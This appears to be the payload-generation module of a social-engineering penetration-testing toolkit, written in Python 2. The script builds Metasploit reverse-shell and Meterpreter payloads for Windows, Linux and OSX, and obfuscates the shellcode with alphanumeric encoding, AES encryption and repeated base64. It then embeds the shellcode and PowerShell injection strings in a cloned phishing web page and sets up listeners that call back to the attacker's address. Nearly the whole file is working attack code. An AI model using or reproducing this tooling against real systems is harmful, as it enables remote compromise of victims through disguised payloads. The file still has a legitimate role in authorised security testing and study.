#!/usr/bin/env python
## Import modules
import subprocess
import time
import sys
import os
import re
import socket
import base64
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *

try:
    if len(check_options("IPADDR=")) > 2:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = ""
except: 
    ipaddr = ""

me = mod_name()
listener="notdefined"
definepath=os.getcwd()
sys.path.append(definepath)
port1 = "8080"
port2 = "8081"
operating_system = check_os()

# check stage encoding - shikata ga nai for payload delivery
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off": stage_encoding = "false"
else: stage_encoding = "true"

configfile=file("/etc/setoolkit/set.config","r").readlines()

# check the metasploit path
msf_path = meta_path()

# check the config files for all of the flags needed for the file
auto_migrate=check_config("AUTO_MIGRATE=")
meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
linux_meterpreter_multi=check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
meterpreter_multi_command=check_config("METERPRETER_MULTI_COMMANDS=")
meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
unc_embed = check_config("UNC_EMBED=")

attack_vector=0
linosx=0
multiattack=""
# grab attack vector
if os.path.isfile(setdir + "/attack_vector"):
    fileopen=file(setdir + "/attack_vector", "r")
    for line in fileopen:
        line=line.rstrip()
        if line == "java":
            attack_vector="java"
        if line == "multiattack":
            attack_vector="multiattack"
            multiattack=file(setdir + "/multi_payload","w")

# here is a place holder for the multi attack java
# multiattack outputs a file called multi_java if
# this file is present it will allow additional
# functionality
multiattack_java="off"
if os.path.isfile(setdir + "/multi_java"):
    multiattack_java="on"

# custom payloadgen
payloadgen="regular"
if os.path.isfile(setdir + "/payloadgen"):
    payloadgen="solo"

####################################################################################################################################
# grab ipaddr if it hasn't been identified yet
####################################################################################################################################

if check_options("IPADDR=") == False:
    fileopen=file("/etc/setoolkit/set.config", "r")
    data = fileopen.read()
    match = re.search("AUTO_DETECT=ON", data)
    if match:
        try:
            ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ipaddr.connect(('google.com', 0))
            ipaddr.settimeout(2)
            ipaddr=ipaddr.getsockname()[0]
            update_options("IPADDR=" + ipaddr)

        except Exception,e:
            log(e)
            ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener (LHOST)"))
            update_options("IPADDR=" + ipaddr)

    # if AUTO_DETECT=OFF prompt for IP Address
    match=re.search("AUTO_DETECT=OFF", data)
    if match:
		ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
		update_options("IPADDR=" + ipaddr)

# payload selection here
try:

    # Specify path to metasploit
    path=msf_path
    # Specify payload
    # this is encoding

    encode=""
    # this is payload
    choice1=""
    # this is port
    choice3=""
    if os.path.isfile(setdir + "/meterpreter_reverse_tcp_exe"):
        fileopen=file(setdir + "/meterpreter_reverse_tcp_exe", "r")
        for line in fileopen:
        # this reads in the first line of the file which happens to be port
        # when calling through core
            choice3=line.rstrip()
            # change attack_vector to nothing
            attack_vector=""

        # specify payload
        choice1="windows/meterpreter/reverse_tcp"
        # encode using backdoored executable
        encode="16"

    # if we don't trigger on the standard core api call
    if choice1 == "":
        ###################################################
        #        USER INPUT: SHOW PAYLOAD MENU 1          #
        ###################################################
        debug_msg(me,"printing 'text.payload_menu_1'",5)
        show_payload_menu1 = create_menu(payload_menu_1_text, payload_menu_1)
        choice1 = raw_input(setprompt(["4"], ""))

        # default blank then select pyinjector
        if choice1 == "":
            choice1 = "1"

    # check the length and make sure it works
    if choice1 != "":
        choice1 = check_length(choice1,7)
        # convert it to a string
        choice1 = str(choice1)

    custom=0
    counter=0
    flag=0
    encode_stop=0

    # Condition testing of 'choice1'
    # Will use a dictionary list

    if choice1 == "exit":
        exit_set()

    if choice1 == '':
        choice1 = ("1")


    if choice1 == '5' or choice1 == '6' or choice1 == '7':
        encode_stop = 1
        encode = ""

    if choice1 == '7':
        flag = 1

    # here we specify shellcodeexec
    if choice1 == '1' or choice1 == '2' or choice1 == '6':
        encode_stop = 1
        encode = 0

    # 11 is the set interactive shell, 12 is set rev http shell and 13 is ratte listener
    if choice1 == '3' or choice1 == '4' or choice1 == "5":
        encoder = 'false'
        payloadgen = 'solo'
        encode_stop = 1
        filewrite = file(setdir + "/set.payload", "w")
        # select setshell
        if choice1 == '3':
            filewrite.write("SETSHELL")
        # select setshell_reverse
        if choice1 == '4':
            filewrite.write("SETSHELL_HTTP")
        # select ratte
        if choice1 == '5':
            filewrite.write("RATTE")
        filewrite.close()

    if choice1 != "7":
        # if not then import the payload selection
        choice1 = ms_payload_2(choice1)

    # don't do courtesy shell
    if counter==0:
        courtesyshell=("")

    # if custom
    if choice1=='7':
        print_info("Example: /root/custom.exe")
        choice1=raw_input(setprompt(["4"], "Enter the path to your executable"))
        if not os.path.isfile(choice1):
            while 1:
                print_error("ERROR:File not found. Try Again.")
                choice1=raw_input(setprompt(["4"], "Enter the path to your executable"))
                if os.path.isfile(choice1):
                    break

        update_options("CUSTOM_EXE=%s" % (choice1))
        custom=1

    # if we are using our own executable
    if custom == 1:
        check_write=file(setdir + "/custom.exe", "w")
        check_write.write("VALID")
        check_write.close()
        shutil.copyfile("%s" % (choice1), "msf.exe")
        shutil.copyfile("msf.exe", setdir + "/msf.exe")

    # Specify Encoding Option
    encoder="false"

    # if we aren't using the set shell
    if choice1 != "set/reverse_shell":
        # we need to rewrite index.html real quick because it has a parameter that could get confusing
        if os.path.isfile(setdir + "/web_clone/index.html"):
            fileopen = file(setdir + "/web_clone/index.html" ,"r")
            data = fileopen.read()
            data = data.replace("freehugs", "")
            os.remove(setdir + "/web_clone/index.html")
            filewrite=file(setdir + "/web_clone/index.html", "w")
            filewrite.write(data)
            filewrite.close()

        # Specify Remote Host if ipaddr.file is missing (should never get here)
        if check_options("IPADDR=") == 0:
            choice2=raw_input(setprompt(["4"], "IP Address of the listener/attacker (reverse) or host/victim (bind shell)"))
            update_options("IPADDR=" + choice2)

        choice2 = check_options("IPADDR=")

        # specify the port for the listener
        if choice3 == "":
            if choice1 != "shellcode/multipyinject":
		if custom == 0:
	                choice3=raw_input(setprompt(["4"], "PORT of the listener [443]"))

        # here we check if the user really wants to use port 80
        if choice3 == "80":
            print_warning("WARNING: SET Web Server requires port 80 to listen.")
            print_warning("WARNING: Are you sure you want to proceed with port 80?")
            port_choice_option = raw_input("\nDo you want to keep port 80? [y/n]")
            if port_choice_option == "n":
                # reprompt it
                choice3=raw_input(setprompt(["4"], "PORT of listener [443]"))

        if choice3 == '': choice3 = '443'
        # this is needed for the set_payload
        update_options("PORT=" + choice3)

        # if we are using the SET interactive shell then do this
        if choice1 == "set/reverse_shell":
            encoder = "false"
            filewrite=file(setdir + "/set.payload.posix", "w")
            filewrite.write("true")
            filewrite.close()
            import src.core.payloadprep

        # if were using the multiattack option
        if attack_vector == "multiattack":
            multiattack.write("MAIN="+str(choice3)+"\n")
            multiattack.write("MAINPAYLOAD="+str(choice1)+"\n")

        # if encoding is required, it will place 1msf.exe first then encode it to msf.exe
        if encoder == "true":
            choice4=("raw")
            msf_filename=("1msf.exe")
        if encoder == "false":
            choice4=("exe")
            msf_filename=("msf.exe")

        # set choice to blank for ALL PORTS scan
        if flag == 0:
            portnum="LPORT="+choice3
        if flag == 1:
            portnum=""

        if encode != "BACKDOOR":
            # if we aren't using the set reverse shell
            if choice1 != "set/reverse_shell":
                # if we are using shellcodeexec
                if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
                        print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n")
                        # select payload
                        choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                        # select default meterpreter reverse tcp
                        if choice9 == "" or choice9 == "1":
                            choice9 = "windows/meterpreter/reverse_tcp"
                        # select reverse https
                        if choice9 == "2":
                            choice9 = "windows/meterpreter/reverse_https"
                        # select reverse http
                        if choice9 == "3":
                            choice9 = "windows/meterpreter/reverse_http"
                        # select all ports
                        if choice9 == "4":
                            choice9 = "windows/meterpreter/reverse_tcp_allports"
                        if ipaddr == "":
                            # grab ipaddr if not defined
                            ipaddr = check_options("IPADDR=")

                    if choice1 == "shellcode/alphanum":
                        print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
			subprocess.Popen("%smsfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (meta_path(),choice9,choice2,portnum,setdir), shell=True).wait()

                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                        # here we update set options to specify pyinjection and multipy
                        update_options("PYINJECTION=ON")
                    # define, this will eventually be all of our payloads
                        multipyinject_payload = ""
                        # clean up old file
                        if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                            os.remove("%s/meta_config_multipyinjector" % (setdir))

                        # remove any old payload options
                        if os.path.isfile(setdir + "/payload.options.shellcode"): os.remove(setdir + "/payload_options.shellcode")
                        # this is the file that gets saved with the payload and port options
                        payload_options = file(setdir + "/payload_options.shellcode", "a")
                        
                        while 1:
                                                
                            if choice1 == "shellcode/multipyinject":
                                print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                                # select default meterpreter reverse tcp
                                if choice9 == "" or choice9 == "1": choice9 = "windows/meterpreter/reverse_tcp"
                                # select reverse https
                                if choice9 == "2": choice9 = "windows/meterpreter/reverse_https"
                                # select reverse http
                                if choice9 == "3": choice9 = "windows/meterpreter/reverse_http"
                                # select all ports
                                if choice9 == "4": choice9 = "windows/meterpreter/reverse_tcp_allports"
                                if choice9 == "5": choice9 = "windows/shell/reverse_tcp"
                                # check the ipaddr
                                if ipaddr == "":
                                    # grab ipaddr if not defined
                                    ipaddr = check_options("IPADDR=")
                                # break out if not needed
                                if choice9 == "6": break

                                shellcode_port = raw_input(setprompt(["4"], "Enter the port number [443]"))
                                if shellcode_port == "": shellcode_port = "443"

                                # here we prep our meta config to listen on all the ports we want - free hugs all around
                                filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                if port_check == False:
                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset EnableStageEncoding %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (choice9, stage_encoding,ipaddr, shellcode_port))
                                    filewrite.close()

                            if validate_ip(choice2) == False:
                                if choice9 != "windows/meterpreter/reverse_https":
                                    if choice9 != "windows/meterpreter/reverse_http":
                                        print_status("Possible hostname detected, switching to windows/meterpreter/reverse_https")
                                        choice9 == "windows/meterpreter/reverse_https"

                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
                                portnum = "LPORT=1"
                            # fix port num
                            if "multipyinject" in choice1:
                                portnum = shellcode_port

                            else: portnum = portnum.replace("LPORT=", "")

                            # meterpreter reverse_tcp
                            if choice9 == "windows/meterpreter/reverse_tcp": 
                                shellcode = metasploit_shellcode(choice9, choice2, portnum)
                            # meterpreter reverse_https
                            if choice9 == "windows/meterpreter/reverse_https": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # meterpreter reverse_http
                            if choice9 == "windows/meterpreter/reverse_http": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # meterpreter tcp allports
                            if choice9 == "windows/meterpreter/reverse_tcp_allports": 
                                shellcode = metasploit_shellcode(choice9, choice2,portnum)
                            # windows shell reverse_tcp
                            if choice9 == "windows/shell/reverse_tcp": 
                                shellcode = metasploit_shellcode(choice9, choice2, portnum)

                            if choice1 == "shellcode/pyinject":
                                shellcode_port = portnum.replace("LPORT=", "")

                            if validate_ip(choice2) == True:
                                shellcode = shellcode_replace(choice2, shellcode_port, shellcode)

                            # here we write out the payload and port for later use in powershell injection
                            payload_options.write(choice9 + " " + portnum + ",")

                            # break out of the loop if we are only using one payload else keep on
                            if choice1 == "shellcode/pyinject": break
                            multipyinject_payload += shellcode + ","
                        
                        
                        # get rid of tail comma
                        if multipyinject_payload.endswith(","):
                            multipyinject_payload = multipyinject_payload[:-1]

                        # if we have multiple payloads, use multi injector
                        if choice1 == "shellcode/multipyinject":
                            # we first need to encrypt the payload via AES 256
                            print_status("Encrypting the shellcode via AES 256 encryption..")
                            secret = os.urandom(32)
                            shellcode = encryptAES(secret, multipyinject_payload)
                            print_status("Dynamic cipher key created and embedded into payload.")
                        filewrite = file("%s/meterpreter.alpha_decoded" % (setdir), "w")
                        filewrite.write(shellcode)
                        filewrite.close()
                    if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                    
                        # close the pyinjector file for ports and payload
                        payload_options.close()
                    # here we are going to encode the payload via base64
                    fileopen = file("%s/meterpreter.alpha_decoded" % (setdir), "r")
                    data = fileopen.read()
                    if payloadgen != "solo":
                        # base64 1
                        data = base64.b64encode(data)
                        # encode it again for the fun 2
                        data = base64.b64encode(data)
                        # again 3
                        data = base64.b64encode(data)
                        # again 4
                        data = base64.b64encode(data)
                        # again 5
                        data = base64.b64encode(data)
                        # again 6
                        data = base64.b64encode(data)
                        # again 7
                        data = base64.b64encode(data)
                        # again 8
                        data = base64.b64encode(data)
                        # 9
                        data = base64.b64encode(data)
                        # 10
                        data = base64.b64encode(data)
                        # last one
                        data = base64.b64encode(data)
                        #
                    filewrite = file("%s/meterpreter.alpha" % (setdir), "w")
                    filewrite.write(data)
                    filewrite.close()
                    if choice1 == "shellcode/alphanum":
                        print_status("Prepping shellcodeexec for delivery..")
                    if choice1 == "shellcode/pyinject":
                        print_status("Prepping pyInjector for delivery..")
                    # prepping multi pyinjector
                    if choice1 == "shellcode/multipyinject":
                        print_status("Prepping Multi-pyInjector for delivery..")
                    # here we obfuscate the binary a little bit
                    random_string = generate_random_string(3,3).upper()
                    if choice1 == "shellcode/alphanum":
                        fileopen = file("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
                    if choice1 == "shellcode/pyinject":
                        fileopen = file("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
                    if choice1 == "shellcode/multipyinject":
                        fileopen = file("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()

		    # write out the payload
		    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
			filewrite=file(setdir + "/msf.exe", "wb")
			filewrite.write(fileopen)
			filewrite.close()

                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                    # we need to read in the old index.html file because its already generated, need to present the alphanum to it
                    if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                        fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                        fileopen2 = file("%s/meterpreter.alpha" % (setdir), "r")
                        alpha_shellcode = fileopen2.read().rstrip()
                        data = fileopen.read()
                        data = data.replace('param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                        if choice1 == "shellcode/multipyinject":
                            secret = base64.b64encode(secret)
                            data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
                        filewrite.write(data)

                        # close file
                        filewrite.close()

                        # rename file
                        if choice1 == "shellcode/alphanum":
                            print_status("Prepping website for alphanumeric injection..")
                        if choice1 == "shellcode/pyinject":
                            print_status("Prepping website for pyInjector shellcode injection..")
                        print_status("Base64 encoding shellcode and prepping for delivery..")
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                    if choice9 == "windows/meterpreter/reverse_tcp_allports":
                        portnum = "LPORT=1"
                        choice3 = "1"

                        # UPDATE THE SET CONFIG OPTIONS
                        update_options("PORT=1")

                    # here we specify the payload name thats stored later on
                    choice1 = choice9

        # write out the payload for powershell injection to pick it up if used
        filewrite = file(setdir + "/metasploit.payload", "w")
        filewrite.write(choice1)
        filewrite.close()
        # import if on
        setshell_counter = 0
        powershell = check_config("POWERSHELL_INJECTION=")
        if powershell.lower() == "on" or powershell.lower() == "yes":
            if choice1 == "set/reverse_shell" or choice1 == "RATTE":
                print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                setshell_counter = 1
            if setshell_counter == 0:
	     if custom == 0: # or choice1 != "set/reverse_shell" or choice1 != "shellcode/alphanum":
                if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                    try: reload(src.payloads.powershell.prep)
                    except: import src.payloads.powershell.prep
                    if os.path.isfile("%s/x86.powershell" % (setdir)):
                        fileopen1 = file("%s/x86.powershell" % (setdir), "r")
                        x86 = fileopen1.read()
                        # open up the x86 powershell attack
                        fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                        data = fileopen3.read()
                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (x86))
                        data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (x86))
                        # check if we don't want to deploy binaries
                        deploy_binaries = check_config("DEPLOY_BINARIES=")
                        if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
                            data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
			if deploy_binaries.lower() == "y" or deploy_binaries.lower() == "yes":
				data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
                        filewrite.write(data)
                        filewrite.close()
                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), stdout=subprocess.PIPE, shell=True)

	# here we specify the binary to deploy if we are using ones that are required to drop binaries
	if custom == 1 or choice1 == "set/reverse_shell" or choice1 == "shellcode/alphanum":
        	fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                data = fileopen3.read()
                # check if we don't want to deploy binaries
                data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
                filewrite.write(data)
                filewrite.close()
                subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # specify attack vector as SET interactive shell
        if choice1 == "set/reverse_shell": attack_vector = "set_payload"

        # if we have the java attack, multiattack java, and the set interactive shell
        if attack_vector == "java" or multiattack_java == "on":
            if attack_vector != "set_payload":
                # pull in the ports from config
                port1=check_config("OSX_REVERSE_PORT=")
                # if we are using the multiattack, there will be port conflicts, need to scoot it to 8082
                if attack_vector == "multiattack":
                    port1 = "8082"
                # deploy nix and linux binaries
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":

                    # if we are using a custom linux/osx payload
                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD=").lower() == "on":
                        osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
                        lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
                        print_status("Copying custom payloads into proper directory structure.")
                        # if we didn't specify blank
                        if osx_path != "":
                            while 1:
                                if not os.path.isfile(osx_path):
                                    print_error("File not found, enter the path again.")
                                    osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
                                if os.path.isfile(osx_path): break

                            if osx_path != "":
                                # copy the payload
                                shutil.copyfile(osx_path, setdir + "/mac.bin")
                    
                        # if linux payload
                        if lin_path != "":
                            while 1:
                                if not os.path.isfile(lin_path):
                                    print_error("File not found, enter the path again.")
                                    lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
                                if os.path.isfile(lin_path): 
                                        break
                                    
                            if lin_path != "":
                                # copy the payload
                                shutil.copyfile(lin_path, setdir + "/nix.bin")

                    else:

                        port2=check_config("LINUX_REVERSE_PORT=")
                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                        print_status("Generating OSX payloads through Metasploit...")
                        subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(),osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        print_status("Generating Linux payloads through Metasploit...")
                        subprocess.Popen(r"%smsfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (meta_path(),linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        if multiattack_java == "on":
                            multiattack.write("OSX="+str(port1)+"\n")
                            multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
                            multiattack.write("LINUX="+str(port2)+"\n")
                            multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))

                    osxcheck = check_options("MAC.BIN=")
                    linuxcheck = check_options("NIX.BIN=")
                    shutil.copyfile(setdir + "/mac.bin", setdir + "/web_clone/%s" % (osxcheck))
                    shutil.copyfile(setdir + "/nix.bin", setdir + "/web_clone/%s" % (linuxcheck))


        # try block here
        try:
            # if they want a listener, start here
            if os.path.isfile("%s/meta_config" % (setdir)):
                    # if its already created
                filewrite=file("%s/meta_config" % (setdir), "a")

            if not os.path.isfile("%s/meta_config" % (setdir)):
                # if we need to create it
                filewrite = file("%s/meta_config" % (setdir), "w")

            # if there isn't a multiattack metasploit, setup handler
            if not os.path.isfile("%s/multi_meta" % (setdir)):

                port_check = check_ports("%s/meta_config" % (setdir), choice3)
                if port_check == False:
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD "+choice1+"\n")
                    filewrite.write("set LHOST " + ipaddr + "\n")
                    if flag == 0:
                        filewrite.write("set LPORT "+choice3+"\n")

                    filewrite.write("set EnableStageEncoding %s\n" % (stage_encoding))
                    filewrite.write("set ExitOnSession false\n")

                    if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")

                    # config option for using multiscript meterpreter
                    if meterpreter_multi == "ON":
                        multiwrite=file(setdir + "/multi_meter.file", "w")
                        multiwrite.write(meterpreter_multi_command)
                        filewrite.write("set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
                        multiwrite.close()
                    filewrite.write("exploit -j\r\n\r\n")

                # if we want to embed UNC paths for hashes
                if unc_embed == "ON":
                    filewrite.write("use server/capture/smb\n")
                    filewrite.write("exploit -j\r\n\r\n")

                # if only doing payloadgen then close the stuff up
                if payloadgen == "solo": filewrite.close()

            # Define linux and OSX payloads
            if payloadgen == "regular":
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
                    filewrite.write("set LHOST "+choice2+"\n")
                    filewrite.write("set LPORT "+port1+"\n")
                    filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\r\n\r\n")
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
                    filewrite.write("set LHOST "+choice2+"\n")
                    filewrite.write("set LPORT "+port2+"\n")
                    if linux_meterpreter_multi == "ON":
                        multiwrite=file(setdir + "/lin_multi_meter.file", "w")
                        multiwrite.write(linux_meterpreter_multi_command)
                        filewrite.write("set InitialAutorunScript multiscript -rc %s/lin_multi_meter.file\n" % (setdir))
                        multiwrite.close()
                        filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\r\n\r\n")
            filewrite.close()


        except Exception, e:
            log(e)
            print_error("ERROR:Something went wrong:")
            print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# Catch all errors
except KeyboardInterrupt:
    print_warning("Keyboard Interrupt Detected, exiting Payload Gen")

# finish closing up the remenant files
if attack_vector == "multiattack":
    multiattack.close()
if os.path.isfile("%s/fileformat.file" % (setdir)):
    filewrite=file("%s/payload.options" % (setdir), "w")
    filewrite.write(choice1 + " " + ipaddr + " " + choice3)
    filewrite.close()

if choice1 == "set/reverse_shell":
    if os.path.isfile(setdir + "/meta_config"): os.remove(setdir + "/meta_config")
